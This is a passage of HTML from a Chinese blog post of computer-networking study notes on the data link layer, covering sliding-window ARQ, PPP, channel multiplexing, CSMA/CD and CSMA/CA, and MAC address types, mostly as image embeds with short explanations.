srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>回退N帧协议在流水线传输的基础上利用发送窗口来限制发送方连续发送数据分组的数量，是一种连续ARQ协议</li><li>在协议的工作过程中发送窗口和接收窗口不断向前滑动，因此这类协议又称为滑动窗口协议</li><li>由于回退N帧协议的特性，当通信线路质量不好时，其信道利用率并不比停止-等待协议高</li></ul><h3 id="选择重传协议SR"><a href="#选择重传协议SR" class="headerlink" title="选择重传协议SR"></a>选择重传协议SR</h3><p>仅重传出现误码的数据分组</p><p>接收方不再使用累计确认，而是对每个正确接收到的数据分组进行逐一确认</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941385357615.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941385357615.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941385685017.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941385685017.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="点对点协议PPP"><a href="#点对点协议PPP" class="headerlink" title="点对点协议PPP"></a>点对点协议PPP</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005175351795.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005175351795.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941386270519.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941386270519.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>PPPoE 是为<strong>宽带上网</strong>的主机使用的链路层协议</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941386794021.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941386794021.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>为在点对点链路传输各种协议数据报提供了一个标准方法，主要由以下三部分构成：</p><ul><li>对各种协议数据报的封装方法(封装成帧)</li><li>链路控制协议<strong>LCP</strong>——用于建立、配置以及测试数据链路的连接</li><li>一套网络控制协议<strong>NCPs</strong>——其中每一个协议支持不同的网络层协议</li></ul><p><strong>帧格式</strong>：必须规定特殊的字符作为帧定界符</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941387189923.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941387189923.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>透明传输</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005180251222.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005180251222.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005180303326.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005180303326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>差错检验</strong></p><p>能够对接收端收到的帧进行检测，并立即丢弃有差错的帧。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941388066825.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941388066825.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>工作状态</strong></p><ul><li><p>当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。</p></li><li><p>PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。</p></li><li><p>这些分组及其响应选择一些 PPP 参数，并进行网络层配置，NCP 给新接入的 PC 机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。</p></li><li><p>通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。</p></li></ul><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941388646327.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941388646327.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>可见，PPP 协议已不是纯粹的数据链路层的协议，它还包含了物理层和网络层的内容。</p></blockquote><h2 id="媒体接入控制（介质访问控制）——广播信道"><a href="#媒体接入控制（介质访问控制）——广播信道" class="headerlink" title="媒体接入控制（介质访问控制）——广播信道"></a>媒体接入控制（介质访问控制）——广播信道</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006104345507.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006104345507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941389529229.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941389529229.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941389910131.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941389910131.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>数据链路层的两个子层：逻辑链路控制、媒体接入控制</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006104731038.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006104731038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941392293733.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941392293733.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006104856062.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006104856062.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941392963735.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941392963735.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>媒体接入控制</strong></p><ul><li>静态划分信道<ul><li>频分多址</li><li>时分多址</li><li>码分多址</li></ul></li><li>动态接入控制<ul><li>随机接入（共享式以太网）</li></ul></li></ul><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941393332937.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941393332937.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006105222356.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006105222356.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="静态划分信道（物理层信道复用技术）"><a href="#静态划分信道（物理层信道复用技术）" class="headerlink" title="静态划分信道（物理层信道复用技术）"></a>静态划分信道（物理层信道复用技术）</h3><p><strong>信道复用</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941394103439.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941394103439.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="频分复用FDM-Frequency-Division-Multiplexing"><a href="#频分复用FDM-Frequency-Division-Multiplexing" class="headerlink" title="频分复用FDM (Frequency Division Multiplexing)"></a>频分复用FDM (Frequency Division Multiplexing)</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006105411778.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006105411778.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="时分复用TDM-Time-Division-Multiplexing"><a href="#时分复用TDM-Time-Division-Multiplexing" class="headerlink" title="时分复用TDM (Time Division Multiplexing)"></a>时分复用TDM (Time Division Multiplexing)</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006105532176.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006105532176.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="波分复用-WDM-Wavelength-Division-Multiplexing"><a href="#波分复用-WDM-Wavelength-Division-Multiplexing" class="headerlink" title="波分复用 WDM(Wavelength Division Multiplexing)"></a>波分复用 WDM(Wavelength Division Multiplexing)</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941395490841.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941395490841.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>波分复用就是光的频分复用，使用一根光纤来同时传输多个光载波信号</p><p>光信号传输一段距离后会衰减，所以要用 掺铒光纤放大器 放大光信号</p></blockquote><h4 id="码分复用-CDM-Code-Division-Multiplexing"><a href="#码分复用-CDM-Code-Division-Multiplexing" class="headerlink" title="码分复用 CDM (Code Division Multiplexing)"></a>码分复用 CDM (Code Division Multiplexing)</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941395729043.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941395729043.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941396321245.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941396321245.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941396827747.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941396827747.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>线性代数的知识用到网络应用中</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941397357949.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941397357949.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="动态接入控制"><a href="#动态接入控制" class="headerlink" title="动态接入控制"></a>动态接入控制</h3><h4 id="随机接入（CSMA-CD协议）"><a href="#随机接入（CSMA-CD协议）" class="headerlink" title="随机接入（CSMA/CD协议）"></a>随机接入（CSMA/CD协议）</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006110506164.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006110506164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006110553498.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006110553498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398097051.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398097051.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398387153.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398387153.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h5 id="多址接入MA"><a href="#多址接入MA" class="headerlink" title="多址接入MA"></a>多址接入MA</h5><p>表示许多主机以多点接入的方式连接在一根总线上。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398610655.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398610655.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h5 id="载波监听CS"><a href="#载波监听CS" class="headerlink" title="载波监听CS"></a>载波监听CS</h5><p>是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398811857.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941398811857.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>总线上并没有什么“载波”。因此， <strong>“载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号。</strong></p><h5 id="碰撞检测CD"><a href="#碰撞检测CD" class="headerlink" title="碰撞检测CD"></a>碰撞检测CD</h5><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006112857461.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006112857461.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399119359.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399119359.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>为什么要进行碰撞检测？ 因为信号传播时延对载波监听产生了影响</p><p>A 需要单程传播时延的 2 倍的时间，才能检测到与 B 的发送产生了冲突</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399578761.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399578761.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>CSMA/CD协议工作流程</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399758263.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399758263.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h5 id="C-S-M-A-CD协议-工作"><a href="#C-S-M-A-CD协议-工作" class="headerlink" title="C S  M   A/CD协议 工作"></a>C S  M   A/CD协议 工作</h5><p>争用期（碰撞窗口）</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399939565.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941399939565.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>最小帧长</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941400317067.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941400317067.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>最大帧长</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941400634369.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941400634369.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>截断二进制指数退避算法</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941401045871.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941401045871.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>信道利用率</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941401410373.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941401410373.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006115210893.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006115210893.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>帧接收流程</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941402259775.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941402259775.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>使用 CSMA/CD 协议的以太网不能进行全双工通信而<strong>只能进行双向交替通信（半双工通信）。</strong></li><li>每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。</li><li>这种<strong>发送的不确定性</strong>使整个以太网的平均通信量远小于以太网的最高数据率。</li></ul><blockquote><p>CSMA/CD协议曾经用于各种总线结构以太网和双绞线以太网的早起版本中。</p><p><strong>现在的以太网基于交换机和全双工连接，不会有碰撞，因此没有必要使用CSMA/CD协议</strong></p></blockquote><h4 id="随机接入（CSMA-CA协议）"><a href="#随机接入（CSMA-CA协议）" class="headerlink" title="随机接入（CSMA/CA协议）"></a>随机接入（CSMA/CA协议）</h4><p>无线局域网使用的协议：CSMA/CA</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941402598677.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941402598677.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941403126579.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941403126579.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941403418981.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941403418981.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>源站为什么在检测到信道空闲后还要再等待一段时间DIFS？</p><blockquote><p>考虑到可能有其他的站有高优先级的帧要发送。若有，就要让高优先级帧先发送</p></blockquote><p>目的站为什么正确接收数据帧后还要等待一段时间SIFS才能发送ACK帧？</p><blockquote><p>SIFS是最短的帧间间隔，用来分隔开属于一次对话的各帧，在这段时间内，一个站点应当能够从发送方式切换到接收方式</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941403761883.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941403761883.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>信道由忙转为空闲且经过DIFS时间后，还要退避一段随机时间才能使用信道？</strong></p><blockquote><p>防止多个站点同时发送数据而产生碰撞</p></blockquote><p><strong>使用退避算法的时机</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414530351217" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414530351217" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h5 id="CSMA-CA协议的退避算法"><a href="#CSMA-CA协议的退避算法" class="headerlink" title="CSMA/CA协议的退避算法"></a>CSMA/CA协议的退避算法</h5><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414522492214.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414522492214.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414519822213" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414519822213" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h5 id="CSMA-CA协议的信道预约和虚拟载波监听"><a href="#CSMA-CA协议的信道预约和虚拟载波监听" class="headerlink" title="CSMA/CA协议的信道预约和虚拟载波监听"></a>CSMA/CA协议的信道预约和虚拟载波监听</h5><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414515870211.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414515870211.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414512968209.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414512968209.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>虚拟载波监听机制能减少隐蔽站带来的碰撞问题的示例</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414511123207.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414511123207.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006122348127.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006122348127.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="MAC地址、IP地址以及ARP协议"><a href="#MAC地址、IP地址以及ARP协议" class="headerlink" title="MAC地址、IP地址以及ARP协议"></a>MAC地址、IP地址以及ARP协议</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414505734205.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414505734205.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h3><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006123953281.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006123953281.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>广播信道的数据链路层必须使用地址（MAC）</p><p>MAC数据链路层地址</p><p>MAC地址一般被固化在网卡(网络适配器)的电可擦可编程只读存储器EEPROM中，因此MAC地址也被称为硬件地址。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414501738203.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414501738203.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414495372201.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414495372201.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>网络适配器(网卡)：具有全球唯一的MAC地址</p><ul><li>有线局域网适配器(有线网卡)</li><li>无线局域网适配器(无线网卡)</li></ul><p>交换机和路由器有更多的网络接口，会有更多的MAC地址</p><p>MAC地址实际上是对网络上各<strong>接口</strong>的唯一标识，而不是对网路上设备的唯一标识。</p><blockquote><p>MAC地址又称为硬件地址或物理地址。请注意：不要被 “物理” 二字误导认为物理地址属于物理层范畴，物理地址属于数据链路层范畴</p></blockquote><h4 id="IEEE-802局域网的MAC地址格式"><a href="#IEEE-802局域网的MAC地址格式" class="headerlink" title="IEEE 802局域网的MAC地址格式"></a>IEEE 802局域网的MAC地址格式</h4><p>MAC地址一共有6个字节(48位)</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414493209199.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414493209199.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414491506197.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414491506197.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>关于无效的 MAC 帧</p><ul><li><p>数据字段的长度与长度字段的值不一致；</p></li><li><p>帧的长度不是整数个字节；</p></li><li><p>用收到的帧检验序列 FCS 查出有差错；</p></li><li><p>数据字段的长度不在 46 ~ 1500 字节之间。</p></li><li><p>有效的 MAC 帧长度为 64 ~ 1518 字节之间。</p></li></ul><p>对于检查出的无效 MAC 帧就简单地丢弃。以太网不负责重传丢弃的帧。</p><h4 id="IEEE-802局域网的MAC地址发送顺序"><a href="#IEEE-802局域网的MAC地址发送顺序" class="headerlink" title="IEEE 802局域网的MAC地址发送顺序"></a>IEEE 802局域网的MAC地址发送顺序</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414489013195.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414489013195.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="单播MAC地址举例"><a href="#单播MAC地址举例" class="headerlink" title="单播MAC地址举例"></a>单播MAC地址举例</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414487858193.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414487858193.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>主机B给主机C发送单播帧，主机B首先要构建该单播帧，在帧首部中的目的地址字段填入主机C的MAC地址，源地址字段填入自己的MAC地址，再加上帧首部的其他字段、数据载荷以及帧尾部，就构成了该单播帧。</p><p>主机B将该<strong>单播帧</strong>发送出去，主机A和C都会收到该<strong>单播帧</strong></p><p>主机A的网卡发现该<strong>单播帧</strong>的目的MAC地址与自己的MAC地址不匹配，丢弃该帧。</p><p>主机C的网卡发现该<strong>单播帧</strong>的目的MAC地址与自己的MAC地址匹配，接受该帧。并将该帧交给其上层处理</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414485786191.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414485786191.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="广播MAC地址举例"><a href="#广播MAC地址举例" class="headerlink" title="广播MAC地址举例"></a>广播MAC地址举例</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414483475189.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414483475189.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>假设主机B要发送一个<strong>广播帧</strong>，主机B首先要构建该<strong>广播帧</strong>，<strong>在帧首部中的目的地址字段填入广播地址</strong>，也就是十六进制的全F，源地址字段填入自己的MAC地址，再加上帧首部中的其他字段、数据载荷以及帧尾部，就构成了该<strong>广播帧</strong>。主机B讲该广播帧发送出去，主机A和C都会收到该广播帧，发现该帧首部中的目的地址字段的内容是广播地址，就知道该帧是广播帧，主机A和主机C都接受该帧，并将该帧交给上层处理。</p><h4 id="多播MAC地址举例"><a href="#多播MAC地址举例" class="headerlink" title="多播MAC地址举例"></a>多播MAC地址举例</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414481595187.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414481595187.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>假设主机A要发送多播帧给该多播地址。将该多播地址的左起第一个字节写成8个比特，第一个字节的最低比特位是1，这就表明该地址是多播地址。快速判断地址是不是多播地址，就是上图所示箭头所指的第十六进制数不能整除2（1,3,5,7,9,B,D,F），则该地址是多播地址。</p><p>假设主机B，C和D支持多播，各用户给自己的主机配置多播组列表如下所示</p><p>主机B属于两个多播组，主机C也属于两个多播组，而主机D不属于任何多播组</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414479643185.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414479643185.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>主机A首先要构建该多播帧，在帧首部中的目的地址字段填入该多播地址，源地址点填入自己的MAC地址，再加上帧首部中的其他字段、数据载荷以及帧尾部，就构成了该多播帧。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414477831183.webp" class="lazyload placeholder" 